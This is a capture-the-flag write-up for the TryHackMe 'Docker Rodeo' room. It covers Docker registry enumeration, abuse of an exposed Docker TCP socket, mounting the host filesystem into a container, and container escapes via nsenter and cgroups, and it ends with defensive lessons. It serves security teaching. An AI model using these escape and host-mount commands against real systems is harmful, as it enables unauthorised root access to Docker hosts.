# Docker Rodeo Writeup
Find this guided CTF on TryHackMe. https://tryhackme.com/room/dockerrodeo

## Task 1

This task is just basic set-up of the room. The instructions are clear and no answers are needed.

## Task 2

This task is an explanation of docker and its relationship with hypervisors and host OSes. The answer to the question is given in the task description.

## Task 3

Task 3 is empty.

## Task 4

Task 4 also contains no questions.

## Task 5

In this task we learn useful endpoints of the docker registry API.

Detect docker registries via nmap (WARN: SLOW):
```bash
nmap -sV -p- {target-ip}
```

*HTTP examples here are given in Httpie format*

List images:
```bash
http GET {target-ip}:{registry-port}/v2/_catalog
```

Images are listed as `repository/name`.

List tags of an image:
```bash
http GET {target-ip}:{registry-port}/v2/{repository}/{name}/tags/list
```

Retrieve the manifest file of a specific image and tag:
```bash
http GET {target-ip}:{registry-port}/v2/{repository}/{name}/manifests/{tag}
```

Search these manifest files for secrets (often in environment variables or in run commands).

For this lab, look for the database user name and password of the one image running on the second docker registry (not port 5000). See the `nmap` results to find the port of the second registry.

## Task 6

[Dive](https://github.com/wagoodman/dive) is a tool to exploring (and exploiting) docker images.

1. install `dive`
1. pull the image we want to inspect with `docker pull docker-rodeo.thm:5000/dive/example`
1. find the image ID of the images we just pulled with `docker images` under the Image ID column
1. run `dive` with `dive {image-id}`

To complete this task, use `dive` to look for the answers to the task questions. Dive is easy to use, look at the bottom of the pane for useful keyboard commands.

## Task 7

Task 7 explains the possibility of pushing a newer image to a registry that doesn't use authentication. That will cause future pulls of the image to include any changes you made. Consider putting a reverse shell in an image 🤔

## Task 8

Exploring the Docker TCP socket. The target box has Docker listening on port 2375 (discovered during your `nmap` scan in task 5).

```bash
http GET docker-rodeo.thm:2375/version
```

Now that we have information on the docker version running on the host, we can connect our `docker` CLI to the target host. The `-H` flag allows you to specify the host to run the command against.

Experiment:
```bash
docker -H docker-rodeo.thm:2375 ps
docker -H docker-rodeo.thm:2375 network ls
docker -H docker-rodeo.thm:2375 images
```

Use `exec` and `run` to execute commands on the running containers.

You could, for example, remotely run and attach to a container with the host OS file system mounted in it:
```bash
docker -H docker-rodeo.thm:2375 run -v /:/host -it --rm --name get-host-fs {image id of the ubuntu container already on the target}
```

This task does not require any specific answer.

## Task 9

This task assumes you have access to the target docker host. Perhaps through a website vulnerability, or perhaps by mounting the target host's OS in a container and adding an SSH key (or exfiltrating an existing private key). But to simplify, they give you the ssh port, username and password of a user on the target host OS.

```bash
ssh danny@docker-rodeo.thm -p 2233
{enter password `danny` when prompted}
```

Once on the target host, we confirm the user `danny` has access to the docker socket. It does.

Follow the guide as it helps you create a new container with the host OS mounted. Due to the `chroot` command, the host OS appears as the root file system in the container.

## Task 10

Task 10 demonstrates PID collisions, and walks you through an escape via PID 1. This is why we never run containers as root 🤯

If you ever have root on a container, escapting to the host can be as simple as:
```bash
nsenter --target 1 --mount sh
```

There are no questions for this task.

## Task 11

This one took me a minute to understand. We're exploring using cgroups to copy the contents of a file into a new file in the container we're running in. Basically, we're creating a new executable that will run as root and execute the `cat > new file` command.

You will get the flag by following the instructions exactly. You don't need to "Log into the new instance as root" as you're already there as root.

## Task 12

Summarizing lessons learned:
1. Adhere to the principle of least privileges. Don't run processes as root inside your containers. It isn't like a VM, and root in the container can easily be escaped to root on the host.
1. Docker uses "seccomp" to restrict what system calls can be made from a container.
1. Secure your docker daemon.

This task has no questions.

## Task 13

Tips and tricks on how to tell if you're in a container or if docker is running:
1. How many processes can you see? If in a container it will be very few. If on a host or VM it will be many.
1. Look for the presence of a `.dockerenv` file in the fs root. That's how docker passes environment variables to containers. If present, you're most likely in a container.
1. List your "cgroups" with `cd /proc/1` then `cat cgroup`. If you see "/docker/" in the paths, you're in a container.

This task has no questions.

## Task 14

This is the conclusion. This task has no questions.
